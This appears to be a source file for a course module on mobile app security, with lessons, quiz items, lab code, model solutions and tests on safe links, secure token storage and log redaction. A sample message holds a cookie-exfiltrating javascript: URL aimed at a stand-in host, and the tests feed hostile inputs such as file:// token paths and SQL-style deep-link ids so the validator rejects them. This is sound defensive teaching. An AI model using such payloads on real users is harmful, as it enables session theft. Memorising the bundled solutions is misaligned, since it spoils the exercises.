/**
 * MOBILE APP DEVELOPMENT · MODULE 19 · MOBILE APPLICATION SECURITY (part 1)
 *
 * Curriculum 19.1 – 19.8: secure coding principles, input validation,
 * secure storage, HTTPS, authentication versus authorization, hard-coded
 * secrets, backend and database rules, and sensitive data in logs.
 *
 * THIS FILE IS CLIENT-SAFE. Assessment answers live in lib/academy/.
 */

import { expoLab } from "./md-helpers.js";

export const SECTION_ID = "md-s19-security";
export const MODULE = "md-m19-security";

const BTN = `{ minHeight: 48, justifyContent: "center", alignItems: "center", borderRadius: 12, borderWidth: 1, borderColor: "#cbd5e1" }`;

/* ── 19.2 · Untrusted input: links and deep-link parameters ──────────── */
export const LINKS_START = `import * as Linking from "expo-linking";
import { Alert } from "react-native";

/** Hosts our app may open links to. */
const ALLOWED_HOSTS = ["kobo.example", "help.kobo.example"];

/** Is this URL safe to open? Only https to our own hosts, plus mailto: and tel:. */
export function isSafeUrl(url: string): boolean {
  return true;
}

/** Opens a link that came from outside the app (a notification, a server message), if it's safe. */
export async function safeOpen(url: string) {
  await Linking.openURL(url);
}

/** Order ids are 1–10 digits. Anything else in a deep link is refused. */
export function validOrderId(id: unknown): id is string {
  return typeof id === "string";
}
`;
export const LINKS_MODEL = `import * as Linking from "expo-linking";
import { Alert } from "react-native";

/** Hosts our app may open links to. */
const ALLOWED_HOSTS = ["kobo.example", "help.kobo.example"];

/** Is this URL safe to open? Only https to our own hosts, plus mailto: and tel:. */
export function isSafeUrl(url: string): boolean {
  // Linking.parse splits the URL properly (React Native's own URL class is incomplete).
  const parsed = Linking.parse(url.trim());
  // Schemes and host names are case-insensitive.
  const scheme = parsed.scheme?.toLowerCase();
  const hostname = parsed.hostname?.toLowerCase();
  if (scheme === "mailto" || scheme === "tel") return true;
  // Exact host match: "kobo.example.evil.com" and "evil.com/?kobo.example" are not ours.
  return scheme === "https" && !!hostname && ALLOWED_HOSTS.includes(hostname);
}

/** Opens a link that came from outside the app (a notification, a server message), if it's safe. */
export async function safeOpen(url: string) {
  if (!isSafeUrl(url)) {
    Alert.alert("This link can't be opened", "It doesn't lead to a Kobo page.");
    return;
  }
  await Linking.openURL(url);
}

/** Order ids are 1–10 digits. Anything else in a deep link is refused. */
export function validOrderId(id: unknown): id is string {
  return typeof id === "string" && /^\\d{1,10}$/.test(id);
}
`;
const LINKS_LAYOUT = `import { Stack } from "expo-router";

export default function RootLayout() {
  return (
    <Stack>
      <Stack.Screen name="index" options={{ title: "Messages" }} />
      <Stack.Screen name="orders/[id]" options={{ title: "Order" }} />
    </Stack>
  );
}
`;
const LINKS_HOME = `import { Pressable, Text, View } from "react-native";
import { safeOpen } from "@/security/links";

// Messages from the server (or anyone who can send one) may contain links.
const MESSAGES = [
  { id: "1", text: "Track your delivery", url: "https://kobo.example/orders/42" },
  { id: "2", text: "Help centre", url: "https://help.kobo.example/returns" },
  { id: "3", text: "Claim your prize!", url: "https://kobo.example.prize-winner.com/claim" },
  { id: "4", text: "Verify your account", url: "javascript:fetch('https://evil.example/?c='+document.cookie)" },
];

export default function Messages() {
  return (
    <View style={{ padding: 16, gap: 8 }}>
      {MESSAGES.map((m) => (
        <Pressable key={m.id} accessibilityRole="link" onPress={() => safeOpen(m.url)} style={{ minHeight: 44, justifyContent: "center" }}>
          <Text>{m.text}</Text>
        </Pressable>
      ))}
    </View>
  );
}
`;
const LINKS_ORDER = `import { useLocalSearchParams } from "expo-router";
import { useEffect, useState } from "react";
import { Text, View } from "react-native";
import { validOrderId } from "@/security/links";

export default function Order() {
  const { id } = useLocalSearchParams<{ id: string }>();
  const [status, setStatus] = useState("");
  const valid = validOrderId(id);
  useEffect(() => {
    if (valid) fetch("https://api.example.com/orders/" + id).then((r) => r.json()).then((o) => setStatus(o.status));
  }, [id, valid]);
  if (!valid) return <Text style={{ padding: 20 }}>Order not found</Text>;
  return (
    <View style={{ padding: 20 }}>
      <Text>Order #{id}: {status}</Text>
    </View>
  );
}
`;
const LINKS_SERVER = `import { createServer } from "practice-server";

const app = createServer();
app.get("/orders/:id", (req, res) => res.json({ id: req.params.id, status: "On its way" }));
export default app;
`;

/* ── 19.3 · Moving tokens to secure storage ──────────────────────────── */
const V1_LEGACY = `import AsyncStorage from "@react-native-async-storage/async-storage";

// Version 1 of the app (already on users' phones) kept the token here.
export const saveTokenV1 = (token: string) => AsyncStorage.setItem("auth_token", token);
`;
const MIGRATE_START = `import AsyncStorage from "@react-native-async-storage/async-storage";
import * as SecureStore from "expo-secure-store";

const KEY = "auth_token";

/** Runs at start-up: moves a token left in AsyncStorage by version 1 into SecureStore. */
export async function migrateToken(): Promise<void> {}

export const getToken = () => AsyncStorage.getItem(KEY);
export const saveToken = (token: string) => AsyncStorage.setItem(KEY, token);
export const clearToken = () => AsyncStorage.removeItem(KEY);
`;
const MIGRATE_MODEL = `import AsyncStorage from "@react-native-async-storage/async-storage";
import * as SecureStore from "expo-secure-store";

const KEY = "auth_token";

/** Runs at start-up: moves a token left in AsyncStorage by version 1 into SecureStore. */
export async function migrateToken(): Promise<void> {
  const old = await AsyncStorage.getItem(KEY);
  if (!old) return;
  // Copy first, then delete: if the app is killed in between, the token isn't lost.
  if (!(await SecureStore.getItemAsync(KEY))) await SecureStore.setItemAsync(KEY, old);
  await AsyncStorage.removeItem(KEY);
}

export const getToken = () => SecureStore.getItemAsync(KEY);
export const saveToken = (token: string) => SecureStore.setItemAsync(KEY, token);
export const clearToken = () => SecureStore.deleteItemAsync(KEY);
`;
const MIGRATE_LAYOUT = `import { Stack } from "expo-router";
import { useEffect, useState } from "react";
import { migrateToken } from "@/auth/token";

export default function RootLayout() {
  const [ready, setReady] = useState(false);
  useEffect(() => {
    migrateToken().finally(() => setReady(true));
  }, []);
  if (!ready) return null;
  return (
    <Stack>
      <Stack.Screen name="index" options={{ title: "Kobo" }} />
    </Stack>
  );
}
`;
const MIGRATE_HOME = `import { useEffect, useState } from "react";
import { Pressable, Text, View } from "react-native";
import { clearToken, getToken, saveToken } from "@/auth/token";

export default function Home() {
  const [token, setToken] = useState<string | null>(null);
  const [loaded, setLoaded] = useState(false);
  useEffect(() => {
    getToken().then((t) => {
      setToken(t);
      setLoaded(true);
    });
  }, []);
  if (!loaded) return null;
  return (
    <View style={{ padding: 20, gap: 12 }}>
      <Text>{token ? "Signed in" : "Signed out"}</Text>
      {token ? (
        <Pressable accessibilityRole="button" onPress={async () => { await clearToken(); setToken(null); }} style={{ minHeight: 48, justifyContent: "center" }}><Text>Sign out</Text></Pressable>
      ) : (
        <Pressable accessibilityRole="button" onPress={async () => { await saveToken("tok_new_8d2"); setToken("tok_new_8d2"); }} style={{ minHeight: 48, justifyContent: "center" }}><Text>Sign in</Text></Pressable>
      )}
    </View>
  );
}
`;

/* ── 19.8 · Logs ─────────────────────────────────────────────────────── */
export const LOG_START = `/** The app's logger: everything goes through here, never straight to console. */

export function redact(value: unknown): unknown {
  return value;
}

export const log = {
  info: (message: string, data?: unknown) => console.log(message, data ?? ""),
  error: (message: string, data?: unknown) => console.error(message, data ?? ""),
};
`;
export const LOG_MODEL = `/** The app's logger: everything goes through here, never straight to console. */

const SECRET_KEYS = /token|password|passcode|secret|authorization|cookie|pin|cvv|card/i;
const EMAIL = /([A-Za-z0-9._%+-])[A-Za-z0-9._%+-]*@([A-Za-z0-9.-]+\\.[A-Za-z]{2,})/g;

/** A copy with secrets removed and e-mail addresses masked, at any depth. */
export function redact(value: unknown): unknown {
  if (typeof value === "string") return value.replace(EMAIL, "$1***@$2");
  if (Array.isArray(value)) return value.map(redact);
  if (value && typeof value === "object") {
    return Object.fromEntries(Object.entries(value).map(([k, v]) => [k, SECRET_KEYS.test(k) ? "[redacted]" : redact(v)]));
  }
  return value;
}

export const log = {
  // Routine detail only in development builds.
  info: (message: string, data?: unknown) => {
    if (__DEV__) console.log(message, JSON.stringify(redact(data ?? {})));
  },
  // Errors always, but still redacted (they reach crash reports).
  error: (message: string, data?: unknown) => console.error(message, JSON.stringify(redact(data ?? {}))),
};
`;
const LOG_SCREEN = `import { Pressable, Text, View } from "react-native";
import { log } from "@/lib/log";

export default function SignIn() {
  function signIn() {
    const user = { name: "Ada", email: "ada.obi@example.com", password: "kobo1234" };
    const session = { accessToken: "eyJhbGciOiJIUzI1NiJ9.ada", refresh_token: "rt_9f8e7d" };
    log.info("Signed in", { user, session, headers: { Authorization: "Bearer eyJhbGciOiJIUzI1NiJ9.ada" }, card: { last4: "4081" } });
    log.error("Payment failed", { reason: "insufficient_funds", contact: "ada.obi@example.com", pin: "1234" });
  }
  return (
    <View style={{ padding: 20 }}>
      <Pressable accessibilityRole="button" onPress={signIn} style={${BTN}}><Text>Sign in</Text></Pressable>
    </View>
  );
}
`;

export const PART1 = [
  /* ═══════════════ LESSON 121 · 19.1 – 19.2 ═══════════════ */
  {
    id: "md-l121-principles-input",
    moduleId: MODULE,
    sectionId: SECTION_ID,
    order: 1,
    covers: ["19.1", "19.2"],
    title: "Secure Coding and Untrusted Input",
    subtitle: "Thinking like an attacker, and never trusting what comes in",
    estimatedMinutes: 50,
    intro: "You have already built many security habits into this course's labs. This module names them, adds the mobile-specific ones, and checks your apps against them.",
    atoms: [
      {
        id: "a-md-secure-coding",
        title: "Secure coding principles",
        explain:
          "A handful of principles explain most security advice. ASSUME THE CLIENT IS HOSTILE: anyone can unpack your app, read its code and strings, change it, and call your API directly, so everything that matters is enforced on the SERVER. LEAST PRIVILEGE: every user, key, token and permission gets only what it needs (short-lived tokens, scoped API keys, the fewest phone permissions). DEFENCE IN DEPTH: several layers (validation in the app and on the server, auth middleware and database rules), so one mistake isn't a breach. SECURE DEFAULTS: deny unless allowed (allow-lists, not block-lists). MINIMISE DATA: what you don't collect can't leak. FAIL SAFELY: errors shouldn't reveal internals or leave things half-unlocked. And keep it SIMPLE and up to date: complex code and old dependencies are where holes hide.",
        decision: {
          scenario: "To hide a feature from free users, a developer suggests: \"We'll ship the premium screens in the app, but only show the button if isPremium is true in AsyncStorage. Nobody will find them.\"",
          question: "Which principle does this break, and what's the fix?",
          options: [
            { id: "a", text: "It trusts the client: anyone can edit AsyncStorage or the app. The server must check the subscription before returning premium data", why: "Hiding UI is not access control. The premium data (or actions) must come from the server only after it verifies the user's entitlement." },
            { id: "b", text: "It's fine, as long as the key name is obscure", whyWrong: "Security through obscurity: app storage and code are readable on a rooted or jailbroken phone, or by unpacking the app." },
            { id: "c", text: "Store isPremium in SecureStore instead, and it's secure", whyWrong: "Encryption protects data from other apps, not from the phone's owner, who controls the device." },
            { id: "d", text: "Obfuscate the JavaScript bundle", whyWrong: "Obfuscation slows attackers down; it doesn't stop them, and the server still hands out premium data to anyone who asks." },
          ],
          correct: "a",
          aftermath: "The app decides what to SHOW; the server decides what to ALLOW.",
        },
      },
      {
        id: "a-md-input-validation",
        title: "Input validation and safe data handling",
        explain:
          "Treat everything from outside your code as untrusted: user input, API responses, push notification data, deep-link parameters, clipboard, QR codes, files. VALIDATE with allow-lists (an order id is 1–10 digits; reject anything else rather than trying to clean it), on the server always and in the app for safety and UX. Mobile-specific dangers: DEEP LINKS can be triggered by any website or app, so validate their parameters before using them in API paths or navigation; LINKS from servers or messages can carry javascript:, intent:, file: or look-alike domains (kobo.example.prize-winner.com), so only open https links to hosts you trust, compared exactly; WebViews that load untrusted content or expose a bridge (onMessage, injected JavaScript) are a common hole. Parse URLs with a real parser (Linking.parse; React Native's built-in URL class is incomplete), never with includes() or startsWith() on the raw string.",
        webLab: expoLab({
          name: "Kobo",
          layout: LINKS_LAYOUT,
          app: { scheme: "kobo" },
          task:
            "Write src/security/links.ts: isSafeUrl allows only mailto:, tel:, and https links whose host is exactly one of ALLOWED_HOSTS (parse with Linking.parse); safeOpen opens safe links and otherwise shows the alert \"This link can't be opened\"; validOrderId accepts only 1–10 digits. The order screen already uses validOrderId.",
          files: { "src/security/links.ts": LINKS_START, "src/app/index.tsx": LINKS_HOME, "src/app/orders/[id].tsx": LINKS_ORDER, "server/index.js": LINKS_SERVER },
          readOnly: ["src/app/index.tsx", "src/app/orders/[id].tsx", "server/index.js"],
          solution: { "src/security/links.ts": LINKS_MODEL },
          tests: [
            { label: "Only our own https hosts, mailto and tel are safe", check: "const { isSafeUrl } = load('src/security/links.ts'); const good = ['https://kobo.example/orders/42', 'https://help.kobo.example/returns', 'mailto:help@kobo.example', 'tel:+2348031234567', 'HTTPS://KOBO.EXAMPLE/x']; const bad = ['http://kobo.example/', 'https://kobo.example.prize-winner.com/claim', 'https://evil.example/?u=kobo.example', 'javascript:alert(1)', 'intent://scan/#Intent;scheme=zxing;end', 'file:///data/data/ng.kobo.app/token']; return good.every(isSafeUrl) && !bad.some(isSafeUrl);", fail: "Compare the parsed scheme and the exact hostname." },
            { label: "Safe links open; dangerous ones are refused", check: "await press('Track your delivery'); await press('Help centre'); await press('Claim your prize!'); await wait(150); const refused = !!dialog(); await tap('OK'); await press('Verify your account'); await wait(150); const refused2 = !!dialog(); await tap('OK'); const o = opened(); return refused && refused2 && o.includes('https://kobo.example/orders/42') && o.includes('https://help.kobo.example/returns') && !o.some((u) => u.includes('prize') || u.startsWith('javascript'));", fail: "safeOpen: Alert.alert(\"This link can't be opened\") for unsafe links." },
            { label: "Deep links with bad ids are refused before reaching the API", check: "await openLink('kobo://orders/42'); await waitFor(() => hasText('On its way'), 3000); await openLink('kobo://orders/42%20OR%201=1'); await waitFor(() => has('Order not found'), 3000); const { validOrderId } = load('src/security/links.ts'); return !validOrderId('../admin') && !validOrderId('12345678901') && !validOrderId(undefined) && validOrderId('7') && !serverRequests().some((r) => /OR|\\.\\./.test(decodeURIComponent(r.path)));", fail: "validOrderId: /^\\\\d{1,10}$/" },
          ],
          hint: "Linking.parse(url) returns { scheme, hostname, path, queryParams }.",
          successMessage: "Links and deep-link parameters checked against allow-lists before anything happens.",
        }),
      },
    ],
    requirements: { read: true, video: false, assessment: true },
  },

  /* ═══════════════ LESSON 122 · 19.3 – 19.4 ═══════════════ */
  {
    id: "md-l122-storage-https",
    moduleId: MODULE,
    sectionId: SECTION_ID,
    order: 2,
    covers: ["19.3", "19.4"],
    title: "Secure Storage and Secure Communication",
    subtitle: "Protecting data on the phone, and on the way to the server",
    estimatedMinutes: 45,
    intro: "Data has two places to be stolen from: where it rests, and where it travels.",
    atoms: [
      {
        id: "a-md-secure-storage",
        title: "Secure storage of credentials and tokens",
        explain:
          "Credentials (access and refresh tokens, API keys the user entered, PINs) go in SecureStore, backed by the iOS Keychain and Android Keystore; everything in AsyncStorage, SQLite and files is readable by anyone with the unlocked phone, a backup or root access. Real apps also have to FIX old mistakes: if an earlier version stored a token in AsyncStorage, the update must MIGRATE it (copy to SecureStore, then delete the old copy, safely if the app is killed halfway) rather than leave it behind. Keep secrets out of state that gets persisted or logged, clear them at sign-out (Module 12), and consider requireAuthentication options (biometric-protected keychain items) for very sensitive values. Remember: secure storage protects the user from OTHERS; it doesn't make the phone's owner untrusted data trustworthy (that's the server's job).",
        webLab: expoLab({
          name: "Kobo",
          layout: MIGRATE_LAYOUT,
          task:
            "Version 1 of the app saved the token in AsyncStorage. In src/auth/token.ts, write migrateToken() (run at start-up by the root layout): if AsyncStorage has \"auth_token\", copy it to SecureStore (unless SecureStore already has one), then remove it from AsyncStorage. Then switch getToken, saveToken and clearToken to SecureStore.",
          files: { "src/auth/token.ts": MIGRATE_START, "src/legacy/v1.ts": V1_LEGACY, "src/app/index.tsx": MIGRATE_HOME },
          readOnly: ["src/legacy/v1.ts", "src/app/index.tsx", "src/app/_layout.tsx"],
          solution: { "src/auth/token.ts": MIGRATE_MODEL },
          tests: [
            { label: "Updating from version 1 moves the token and keeps the user signed in", check: "await load('src/legacy/v1.ts').saveTokenV1('tok_v1_old'); await restart(); await waitFor(() => has('Signed in') || has('Signed out'), 3000); return has('Signed in') && secureStore().auth_token === 'tok_v1_old' && !('auth_token' in asyncStore());", fail: "Copy to SecureStore, then AsyncStorage.removeItem." },
            { label: "New tokens go straight to SecureStore", check: "await waitFor(() => has('Sign out') || has('Sign in'), 3000); if (has('Sign out')) { await press('Sign out'); await waitFor(() => has('Sign in'), 2000); } await press('Sign in'); await wait(200); return secureStore().auth_token === 'tok_new_8d2' && !JSON.stringify(asyncStore()).includes('tok_new_8d2');", fail: "saveToken uses SecureStore.setItemAsync." },
            { label: "Signing out deletes it", check: "await waitFor(() => has('Sign out'), 3000); await press('Sign out'); await wait(200); return !('auth_token' in secureStore()) && !('auth_token' in asyncStore());", fail: "clearToken uses SecureStore.deleteItemAsync." },
          ],
          hint: "Copy first, delete second: a crash in between must not lose the token.",
          successMessage: "Old installs fixed on update, new tokens stored properly.",
        }),
      },
      {
        id: "a-md-https",
        title: "HTTPS and secure communication",
        explain:
          "Use HTTPS (TLS) for EVERY request and wss:// for WebSockets, including images and analytics. Both platforms block plain http:// by default (iOS App Transport Security; Android's cleartext traffic is disabled from Android 9): don't switch those protections off for production, and never ship code that disables certificate validation (\"trust all certificates\" during debugging is a classic leftover). HTTPS protects against eavesdropping on public Wi-Fi and tampering in transit. CERTIFICATE PINNING (accepting only your server's certificate or key) adds protection against compromised certificate authorities and interception proxies, but a mistake or an unplanned certificate change can lock every user out, so it suits banks and high-risk apps with a careful rotation plan. Also: send secrets in headers or bodies, never in URLs; set HSTS on your website; and remember TLS protects the pipe, not a compromised server.",
        decision: {
          scenario: "A developer testing against a local server writes a network setting that allows all cleartext http:// traffic and trusts any certificate, \"just for now\". The release build is due tomorrow.",
          question: "What should happen before release?",
          options: [
            { id: "a", text: "Remove both: production talks only to https:// endpoints with normal certificate validation; keep any exception limited to development builds and localhost", why: "Allowing cleartext and trusting all certificates in production lets anyone on the same Wi-Fi read or change the app's traffic, tokens included." },
            { id: "b", text: "Keep them: the app uses tokens, so traffic doesn't need encryption", whyWrong: "Tokens sent over plain http can be stolen and replayed by anyone on the network." },
            { id: "c", text: "Keep cleartext but add certificate pinning", whyWrong: "Pinning only applies to TLS; plain http has no certificate to pin." },
            { id: "d", text: "It doesn't matter, because stores reject insecure apps anyway", whyWrong: "Stores don't reliably catch this; it's your responsibility." },
          ],
          correct: "a",
          aftermath: "HTTPS everywhere, certificate validation always, debugging shortcuts never in release.",
        },
      },
    ],
    requirements: { read: true, video: false, assessment: true },
  },

  /* ═══════════════ LESSON 123 · 19.5 – 19.6 ═══════════════ */
  {
    id: "md-l123-authz-secrets",
    moduleId: MODULE,
    sectionId: SECTION_ID,
    order: 3,
    covers: ["19.5", "19.6"],
    title: "Authentication, Authorization and API Keys",
    subtitle: "Two different questions, and which keys may live in an app",
    estimatedMinutes: 40,
    intro: "Two of the most confused ideas in app security, cleared up for good.",
    atoms: [
      {
        id: "a-md-authn-authz",
        title: "Authentication versus authorization",
        explain:
          "AUTHENTICATION answers \"who are you?\" (sign-in, tokens, biometrics; failure: 401 Unauthorized, which really means unauthenticated). AUTHORIZATION answers \"may you do THIS?\" (roles, permissions, ownership, subscription status; failure: 403 Forbidden, or 404 to avoid revealing that a record exists). Being signed in is never permission by itself: every endpoint must check BOTH, and authorization must be checked for the specific record and action every time (Modules 14 and 15). Authorization lives on the server (or in database rules); the app only mirrors it to hide buttons. Most real breaches are authorization failures: a correctly signed-in user reading someone else's data by changing an id.",
        decision: {
          scenario: "A signed-in customer calls GET /orders/7781, which belongs to another customer. The server checks the token is valid and returns the order.",
          question: "What failed, and what should the server answer?",
          options: [
            { id: "a", text: "Authorization failed: authentication worked, but the server never checked ownership. It should answer 404 (or 403) for orders that aren't the user's", why: "A valid token proves who the caller is, not that they may see order 7781; ownership must be checked for every record." },
            { id: "b", text: "Authentication failed; the server should answer 401", whyWrong: "The user is correctly signed in; 401 would wrongly suggest signing in again." },
            { id: "c", text: "Nothing failed: signed-in users can see orders", whyWrong: "Seeing other customers' orders (addresses, phone numbers) is a data breach." },
            { id: "d", text: "The app should hide the order", whyWrong: "The request didn't come from your UI; anyone can call the API directly." },
          ],
          correct: "a",
          aftermath: "Authenticate the caller, then authorize the action on that specific record.",
        },
      },
      {
        id: "a-md-public-keys",
        title: "Avoiding hardcoded API secrets",
        explain:
          "Everything in an app's bundle is public, including EXPO_PUBLIC_ variables and anything \"hidden\" in native code. So sort keys into two kinds. PUBLIC keys are designed to ship, and are safe when RESTRICTED: a Google Maps API key restricted to your Android package and SHA-1 and your iOS bundle id; a Stripe or Paystack PUBLISHABLE key; Firebase's web config; Supabase's anon key (safe only with Row Level Security on every table); Sentry's DSN. SECRET keys must never ship: payment secret keys, database passwords, service-role and admin keys, signing keys, third-party API keys that cost money or expose data (an OpenAI key, an SMS gateway key). Those stay on your server (environment variables or a secret manager), and the app calls YOUR server, which calls the service. If a secret leaks (shipped, logged, committed to Git), ROTATE it at once: removing it from the next version doesn't help, old versions and Git history keep it.",
        decision: {
          scenario: "Kobo's app.json and .env contain: EXPO_PUBLIC_MAPS_KEY (restricted to the app's package and bundle id), EXPO_PUBLIC_PAYSTACK_PUBLIC_KEY (pk_live_…), EXPO_PUBLIC_SUPABASE_ANON_KEY (RLS is on for every table), and EXPO_PUBLIC_SMS_API_KEY for sending OTP texts directly from the app.",
          question: "Which one must be removed from the app?",
          options: [
            { id: "a", text: "The SMS API key: move sending to the server, which keeps the key, and rotate the old one", why: "Anyone who extracts it can send texts at your expense or spam users; the other three are public by design and restricted (by app identity, by being publishable, or by RLS)." },
            { id: "b", text: "The Paystack public key", whyWrong: "Publishable keys are meant to be in apps; the secret key (sk_…) is the one that must stay on the server." },
            { id: "c", text: "The Supabase anon key", whyWrong: "With RLS on every table, the anon key is safe to ship; it's designed for clients." },
            { id: "d", text: "None: EXPO_PUBLIC_ variables are encrypted in the build", whyWrong: "They are inlined as plain text in the JavaScript bundle." },
          ],
          correct: "a",
          aftermath: "Public, restricted keys may ship; secret keys live on the server; leaked secrets get rotated.",
        },
      },
    ],
    requirements: { read: true, video: false, assessment: true },
  },

  /* ═══════════════ LESSON 124 · 19.7 – 19.8 ═══════════════ */
  {
    id: "md-l124-rules-logs",
    moduleId: MODULE,
    sectionId: SECTION_ID,
    order: 4,
    covers: ["19.7", "19.8"],
    title: "Backend Rules and Safe Logging",
    subtitle: "Locking the database down, and keeping secrets out of logs",
    estimatedMinutes: 50,
    intro: "Two quiet places where data leaks: database rules that say yes too easily, and logs that remember too much.",
    atoms: [
      {
        id: "a-md-db-rules",
        title: "Protecting backend services and database rules",
        explain:
          "With your own server, protection is middleware and scoped queries (Modules 14–15). With Supabase or Firebase, the app talks to the database directly, so the RULES are the backend: Supabase's Row Level Security policies (SQL: alter table notes enable row level security; create policy \"own notes\" on notes for select using (auth.uid() = user_id); with check (…) for inserts and updates) and Firebase's security rules (match /notes/{id} { allow read, write: if request.auth != null && request.auth.uid == resource.data.userId; }). Write rules for every table and every operation (select, insert, update, delete), test them with two users and no user (both platforms have rule simulators and emulators), and never use the service-role key in an app. Also protect the services themselves: rate limits, input size limits, and alerts on unusual traffic.",
        decision: {
          scenario: "A Supabase notes table has Row Level Security enabled. Which policy correctly lets each signed-in user read only their own notes?",
          question: "Choose the right SELECT policy.",
          options: [
            { id: "a", text: "create policy \"read own notes\" on notes for select using (auth.uid() = user_id);", why: "auth.uid() is the signed-in user's id from the verified JWT; the policy only returns rows they own." },
            { id: "b", text: "create policy \"read notes\" on notes for select using (true);", whyWrong: "using (true) lets everyone, including anonymous users, read every note." },
            { id: "c", text: "create policy \"read notes\" on notes for select using (auth.role() = 'authenticated');", whyWrong: "Any signed-in user could read everyone's notes: authentication without authorization." },
            { id: "d", text: "Disable RLS and filter by user_id in the app's query", whyWrong: "The app's filter can be removed by anyone calling the API with the anon key." },
          ],
          correct: "a",
          aftermath: "Rules tie every row to the verified user, for every operation.",
        },
      },
      {
        id: "a-md-safe-logging",
        title: "Avoiding sensitive information in logs",
        explain:
          "Logs travel: to the terminal, to crash reporters (Sentry), to analytics, to Android's system log (readable by debugging tools, and once by other apps), to support screenshots. So never log passwords, tokens, Authorization headers, card details, PINs, OTP codes or full personal data. Route all logging through ONE small logger that REDACTS by key (anything named like token, password, secret, authorization, cookie, pin, card), masks personal data (a***@example.com), and turns off routine logs in release builds (__DEV__ is false there); keep errors, redacted, because you need them. Configure crash reporters to scrub data too (Sentry's beforeSend), and say in your privacy disclosures what diagnostics you collect. Watch for leaks in error messages and in screenshots the OS takes for the app switcher.",
        webLab: expoLab({
          name: "Kobo",
          layout: `import { Stack } from "expo-router";\n\nexport default function RootLayout() {\n  return (\n    <Stack>\n      <Stack.Screen name="index" options={{ title: "Sign in" }} />\n    </Stack>\n  );\n}\n`,
          task:
            "Write the logger in src/lib/log.ts: redact(value) returns a copy where any property whose name matches token, password, passcode, secret, authorization, cookie, pin, cvv or card (any case, at any depth, in arrays too) becomes \"[redacted]\", and e-mail addresses in strings become first letter + \"***@\" + domain (ada.obi@example.com → a***@example.com); log.info only logs in development (__DEV__), log.error always; both log the message and JSON of the redacted data.",
          files: { "src/lib/log.ts": LOG_START, "src/app/index.tsx": LOG_SCREEN },
          readOnly: ["src/app/index.tsx"],
          solution: { "src/lib/log.ts": LOG_MODEL },
          tests: [
            { label: "Nothing secret reaches the logs", check: "await press('Sign in'); await wait(150); const all = logs().join('\\n'); return all.includes('Signed in') && all.includes('Payment failed') && all.includes('[redacted]') && !/kobo1234|eyJhbGci|rt_9f8e7d|4081|\"1234\"/.test(all) && all.includes('insufficient_funds');", fail: "Redact by key name, at any depth." },
            { label: "E-mails are masked", check: "await press('Sign in'); await wait(150); const all = logs().join('\\n'); return all.includes('a***@example.com') && !all.includes('ada.obi@example.com');", fail: "Replace each e-mail with its first letter + ***@ + domain." },
            { label: "redact works at any depth", check: "const { redact } = load('src/lib/log.ts'); const r = redact({ a: [{ refreshToken: 'x', n: 1 }], b: { deep: { PASSWORD: 'p', note: 'mail me at bisi@kobo.example' } } }); return JSON.stringify(r) === JSON.stringify({ a: [{ refreshToken: '[redacted]', n: 1 }], b: { deep: { PASSWORD: '[redacted]', note: 'mail me at b***@kobo.example' } } });", fail: "Recurse into arrays and objects; match keys case-insensitively." },
            { label: "Routine logs are off in release builds", device: { build: "production" }, check: "await press('Sign in'); await wait(150); const all = logs().join('\\n'); return !all.includes('Signed in') && all.includes('Payment failed');", fail: "if (__DEV__) console.log(…) for info; errors always." },
          ],
          hint: "Object.fromEntries(Object.entries(value).map(([k, v]) => …)) rebuilds an object.",
          successMessage: "Logs that help you debug without leaking anyone's secrets.",
        }),
      },
    ],
    requirements: { read: true, video: false, assessment: true },
  },
];
